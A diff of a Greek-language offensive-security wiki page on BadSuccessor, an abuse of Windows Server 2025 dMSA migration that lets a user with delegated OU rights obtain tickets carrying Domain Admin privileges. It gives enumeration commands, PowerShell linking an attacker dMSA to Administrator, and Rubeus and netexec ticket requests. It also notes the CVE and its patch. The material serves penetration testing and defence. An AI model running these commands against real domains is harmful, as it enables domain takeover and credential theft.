@@ -4,38 +4,38 @@
 
 ## Επισκόπηση
 
-Το **BadSuccessor** καταχράται το workflow μετεγκατάστασης του **delegated Managed Service Account** (**dMSA**) που εισήχθη στα **Windows Server 2025**. Ένα dMSA μπορεί να συνδεθεί με έναν legacy account μέσω του **`msDS-ManagedAccountPrecededByLink`** και να μετακινηθεί μέσα από τις states μετεγκατάστασης που αποθηκεύονται στο **`msDS-DelegatedMSAState`**. Αν ένας attacker μπορεί να δημιουργήσει ένα dMSA σε ένα writable OU και να ελέγξει αυτά τα attributes, ο KDC μπορεί να εκδώσει tickets για το dMSA που ελέγχει ο attacker με το **authorization context του linked account**.
+Το **BadSuccessor** κάνει abuse στο workflow migration του **delegated Managed Service Account** (**dMSA**), το οποίο εισήχθη στον **Windows Server 2025**. Ένα dMSA μπορεί να συνδεθεί με έναν legacy λογαριασμό μέσω του **`msDS-ManagedAccountPrecededByLink`** και να μετακινηθεί μέσω των migration states που αποθηκεύονται στο **`msDS-DelegatedMSAState`**. Αν ένας attacker μπορεί να δημιουργήσει ένα dMSA σε ένα writable OU και να ελέγχει αυτά τα attributes, το KDC μπορεί να εκδώσει tickets για το dMSA που ελέγχει ο attacker, με το **authorization context του συνδεδεμένου λογαριασμού**.<sup>[[2]](#references)</sup>
 
-Στην πράξη αυτό σημαίνει ότι ένας low-privileged user που έχει μόνο delegated OU rights μπορεί να δημιουργήσει ένα νέο dMSA, να το δείξει στο `Administrator`, να ολοκληρώσει την migration state, και στη συνέχεια να αποκτήσει ένα TGT του οποίου το PAC περιέχει privileged groups όπως οι **Domain Admins**.
+Στην πράξη, αυτό σημαίνει ότι ένας low-privileged user που διαθέτει μόνο delegated OU rights μπορεί να δημιουργήσει ένα νέο dMSA, να το συνδέσει με τον `Administrator`, να ολοκληρώσει το migration state και στη συνέχεια να αποκτήσει ένα TGT του οποίου το PAC περιέχει privileged groups όπως οι **Domain Admins**.<sup>[[2]](#references)</sup>
 
-## Λεπτομέρειες μετεγκατάστασης dMSA που έχουν σημασία
+## Σημαντικές λεπτομέρειες του dMSA migration
 
-- Το dMSA είναι feature των **Windows Server 2025**.
-- Το `Start-ADServiceAccountMigration` θέτει τη migration σε κατάσταση **started**.
-- Το `Complete-ADServiceAccountMigration` θέτει τη migration σε κατάσταση **completed**.
-- `msDS-DelegatedMSAState = 1` σημαίνει ότι η migration ξεκίνησε.
-- `msDS-DelegatedMSAState = 2` σημαίνει ότι η migration ολοκληρώθηκε.
-- Κατά τη διάρκεια νόμιμης migration, το dMSA προορίζεται να αντικαταστήσει το superseded account διαφανώς, έτσι ώστε το KDC/LSA να διατηρούν την πρόσβαση που είχε ήδη το προηγούμενο account.
+- Το dMSA είναι feature του **Windows Server 2025**.
+- Το `Start-ADServiceAccountMigration` θέτει το migration στην κατάσταση **started**.
+- Το `Complete-ADServiceAccountMigration` θέτει το migration στην κατάσταση **completed**.
+- Το `msDS-DelegatedMSAState = 1` σημαίνει ότι το migration ξεκίνησε.
+- Το `msDS-DelegatedMSAState = 2` σημαίνει ότι το migration ολοκληρώθηκε.
+- Κατά τη διάρκεια ενός legitimate migration, το dMSA προορίζεται να αντικαταστήσει διαφανώς τον superseded λογαριασμό, επομένως το KDC/LSA διατηρούν την πρόσβαση που είχε ήδη ο προηγούμενος λογαριασμός.<sup>[[3]](#references)</sup>
 
-Το Microsoft Learn σημειώνει επίσης ότι κατά τη migration το αρχικό account δένεται με το dMSA και το dMSA προορίζεται να έχει πρόσβαση σε ό,τι μπορούσε να έχει πρόσβαση το παλιό account. Αυτή είναι η security assumption που καταχράται το BadSuccessor.
+Το Microsoft Learn σημειώνει επίσης ότι κατά τη διάρκεια του migration ο αρχικός λογαριασμός συνδέεται με το dMSA και το dMSA προορίζεται να έχει πρόσβαση σε ό,τι μπορούσε να προσπελάσει ο παλιός λογαριασμός.<sup>[[3]](#references)</sup> Αυτή είναι η security assumption που κάνει abuse το BadSuccessor.<sup>[[2]](#references)</sup>
 
 ## Απαιτήσεις
 
-1. Ένα domain όπου **υπάρχει dMSA**, πράγμα που σημαίνει ότι υπάρχει υποστήριξη για **Windows Server 2025** στην AD πλευρά.
-2. Ο attacker μπορεί να **δημιουργήσει** `msDS-DelegatedManagedServiceAccount` objects σε κάποιο OU, ή έχει ισοδύναμα broad child-object creation rights εκεί.
-3. Ο attacker μπορεί να **γράψει** τα σχετικά dMSA attributes ή να ελέγχει πλήρως το dMSA που μόλις δημιούργησε.
-4. Ο attacker μπορεί να ζητήσει Kerberos tickets από domain-joined context ή από tunnel που φτάνει LDAP/Kerberos.
+1. Ένα domain όπου υπάρχει **dMSA**, που σημαίνει ότι υπάρχει υποστήριξη **Windows Server 2025** στην πλευρά του AD.
+2. Ο attacker μπορεί να **δημιουργεί** objects `msDS-DelegatedManagedServiceAccount` σε κάποιο OU ή διαθέτει ισοδύναμα broad child-object creation rights εκεί.
+3. Ο attacker μπορεί να κάνει **write** στα σχετικά dMSA attributes ή να ελέγχει πλήρως το dMSA που μόλις δημιούργησε.
+4. Ο attacker μπορεί να ζητά Kerberos tickets από domain-joined context ή από tunnel που φτάνει σε LDAP/Kerberos.<sup>[[2]](#references)</sup>
 
 ### Πρακτικοί έλεγχοι
 
-Το πιο καθαρό operator signal είναι να επαληθεύσετε το domain/forest level και να επιβεβαιώσετε ότι το environment χρησιμοποιεί ήδη το νέο Server 2025 stack:
+Το καθαρότερο operator signal είναι να επαληθεύσετε το domain/forest level και να επιβεβαιώσετε ότι το environment χρησιμοποιεί ήδη το νέο Server 2025 stack:
 ```powershell
 Get-ADDomain | Select Name,DomainMode
 Get-ADForest | Select Name,ForestMode
 ```
 Αν δείτε τιμές όπως `Windows2025Domain` και `Windows2025Forest`, αντιμετωπίστε το **BadSuccessor / dMSA migration abuse** ως έλεγχο προτεραιότητας.
 
-Μπορείτε επίσης να enumerate writable OUs delegated για dMSA creation με public tooling:
+Μπορείτε επίσης να απαριθμήσετε τα writable OUs που έχουν delegated για δημιουργία dMSA με public tooling:<sup>[[1]](#references)</sup>
 ```powershell
 .\Get-BadSuccessorOUPermissions.ps1
 ```
@@ -45,12 +45,12 @@ netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
 ```
 ## Ροή κατάχρησης
 
-1. Δημιούργησε ένα dMSA σε ένα OU όπου έχεις delegated create-child rights.
-2. Όρισε το **`msDS-ManagedAccountPrecededByLink`** στο DN ενός privileged target όπως `CN=Administrator,CN=Users,DC=corp,DC=local`.
-3. Όρισε το **`msDS-DelegatedMSAState`** σε `2` για να σημειώσεις ότι το migration έχει ολοκληρωθεί.
-4. Ζήτησε ένα TGT για το νέο dMSA και χρησιμοποίησε το επιστρεφόμενο ticket για να αποκτήσεις πρόσβαση σε privileged services.
+1. Create ένα dMSA σε ένα OU όπου έχετε delegated create-child rights.
+2. Ορίστε το **`msDS-ManagedAccountPrecededByLink`** στο DN ενός privileged target, όπως `CN=Administrator,CN=Users,DC=corp,DC=local`.
+3. Ορίστε το **`msDS-DelegatedMSAState`** σε `2`, ώστε να επισημάνετε τη migration ως completed.
+4. Ζητήστε ένα TGT για το νέο dMSA και χρησιμοποιήστε το ticket που επιστράφηκε για πρόσβαση σε privileged services.<sup>[[2]](#references)</sup>
 
-Παράδειγμα PowerShell:
+PowerShell example:<sup>[[2]](#references)</sup>
 ```powershell
 New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
 Set-ADServiceAccount attacker_dMSA -Add @{
@@ -58,31 +58,31 @@ msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
 }
 Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
 ```
-Αιτήματα Ticket / παραδείγματα operational tooling:
+Παραδείγματα αιτημάτων ticket / operational tooling:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
 netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
 ```
-## Γιατί αυτό είναι περισσότερο από privilege escalation
+## Γιατί αυτό είναι κάτι περισσότερο από privilege escalation
 
-Κατά τη νόμιμη migration, το Windows πρέπει επίσης να χρησιμοποιεί το νέο dMSA για να χειρίζεται tickets που εκδόθηκαν για τον προηγούμενο account πριν από το cutover. Γι’ αυτό το dMSA-related ticket material μπορεί να περιλαμβάνει **current** και **previous** keys στη ροή **`KERB-DMSA-KEY-PACKAGE`**.
+Κατά τη νόμιμη migration, τα Windows χρειάζονται επίσης το νέο dMSA για τη διαχείριση tickets που εκδόθηκαν για τον προηγούμενο λογαριασμό πριν από το cutover. Γι' αυτό το ticket material που σχετίζεται με dMSA μπορεί να περιλαμβάνει **current** και **previous** keys στη ροή **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>
 
-Για ένα fake migration που ελέγχει ο attacker, αυτή η συμπεριφορά μπορεί να μετατρέψει το BadSuccessor σε:
+Για μια fake migration που ελέγχεται από attacker, αυτή η συμπεριφορά μπορεί να μετατρέψει το BadSuccessor σε:<sup>[[2]](#references)</sup>
 
-- **Privilege escalation** με κληρονομιά privileged group SIDs στο PAC.
-- **Credential material exposure** επειδή ο χειρισμός previous-key μπορεί να εκθέσει material ισοδύναμο με το RC4/NT hash του predecessor σε vulnerable workflows.
+- **Privilege escalation** μέσω κληρονόμησης privileged group SIDs στο PAC.
+- **Έκθεση credential material**, επειδή ο χειρισμός των previous keys μπορεί να εκθέσει material ισοδύναμο με το RC4/NT hash του predecessor σε ευάλωτα workflows.
 
-Αυτό κάνει την technique χρήσιμη τόσο για direct domain takeover όσο και για follow-on operations όπως pass-the-hash ή ευρύτερο credential compromise.
+Αυτό καθιστά την τεχνική χρήσιμη τόσο για άμεσο domain takeover όσο και για επόμενες ενέργειες, όπως pass-the-hash ή ευρύτερο credential compromise.
 
-## Σημειώσεις για την κατάσταση του patch
+## Σημειώσεις σχετικά με το patch status
 
-Η αρχική συμπεριφορά του BadSuccessor **δεν είναι απλώς ένα θεωρητικό preview issue του 2025**. Η Microsoft το όρισε ως **CVE-2025-53779** και δημοσίευσε security update τον **August 2025**. Κρατήστε αυτό το attack τεκμηριωμένο για:
+Η αρχική συμπεριφορά του BadSuccessor **δεν είναι απλώς ένα θεωρητικό ζήτημα του preview του 2025**. Η Microsoft του ανέθεσε το **CVE-2025-53779** και δημοσίευσε security update τον **Αύγουστο του 2025**.<sup>[[4]](#references)</sup> Διατηρήστε τεκμηριωμένο αυτό το attack για:
 
 - **labs / CTFs / assume-breach exercises**
-- **unpatched Windows Server 2025 environments**
-- **validation of OU delegations and dMSA exposure during assessments**
+- **μη patched περιβάλλοντα Windows Server 2025**
+- **επικύρωση των OU delegations και της έκθεσης dMSA κατά τη διάρκεια assessments**
 
-Μην υποθέσετε ότι ένα Windows Server 2025 domain είναι vulnerable απλώς επειδή υπάρχει dMSA· επαληθεύστε το patch level και δοκιμάστε προσεκτικά.
+Μην θεωρείτε ότι ένα domain Windows Server 2025 είναι ευάλωτο απλώς επειδή υπάρχει dMSA· επαληθεύστε το patch level και πραγματοποιήστε προσεκτικά tests.
 
 ## Tools
 
@@ -92,9 +92,9 @@ netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegat
 
 ## References
 
-- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
-- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
-- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
-- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
+- [1] [HTB: Eighteen - Κατάχρηση BadSuccessor dMSA για Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
+- [2] [Akamai - BadSuccessor: Κατάχρηση του dMSA για Privilege Escalation στο Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
+- [3] [Microsoft Learn - Επισκόπηση των Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
+- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
 
 {{#include ../../../banners/hacktricks-training.md}}
